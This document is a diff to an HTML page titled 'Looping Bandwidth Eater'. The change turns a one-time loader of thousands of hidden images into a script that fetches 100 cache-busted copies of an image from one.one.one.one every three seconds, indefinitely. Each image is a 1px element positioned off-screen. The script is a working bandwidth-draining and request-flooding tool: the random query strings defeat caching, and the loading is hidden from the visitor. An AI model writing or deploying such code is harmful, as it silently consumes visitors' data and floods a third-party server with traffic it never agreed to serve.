@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Hidden Image Loader</title>
+  <title>Looping Bandwidth Eater</title>
   <style>
-    .hidden-image {
+    .offscreen {
       position: absolute;
-      left: -9999px; /* Off-screen, but still visible to browser */
+      left: -9999px;
       top: -9999px;
       width: 1px;
       height: 1px;
@@ -14,18 +14,34 @@
   </style>
 </head>
 <body>
-  <h1>Loading 100 Images Silently...</h1>
-  <script>
-    const totalImages = 5000;
-    const baseUrl = 'https://one.one.one.one/media/card.png';
-    const timestamp = Date.now();
+  <h1>Looping image downloads...</h1>
 
-    for (let i = 0; i < totalImages; i++) {
-      const img = new Image();
-      img.src = `${baseUrl}?cb=${timestamp}-${i}`;
-      img.className = 'hidden-image';
-      document.body.appendChild(img);
+  <script>
+    const baseUrl = 'https://one.one.one.one/media/card.png';
+    const imagesPerBatch = 100;
+    const interval = 3000; // milliseconds between each cycle
+
+    let container = document.createElement('div');
+    document.body.appendChild(container);
+
+    function loadImages() {
+      // Clear previous batch
+      container.innerHTML = '';
+
+      for (let i = 0; i < imagesPerBatch; i++) {
+        const img = new Image();
+        const cb = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
+        img.src = `${baseUrl}?cb=${cb}`;
+        img.className = 'offscreen';
+        container.appendChild(img);
+      }
     }
+
+    // Initial load
+    loadImages();
+
+    // Loop
+    setInterval(loadImages, interval);
   </script>
 </body>
 </html>
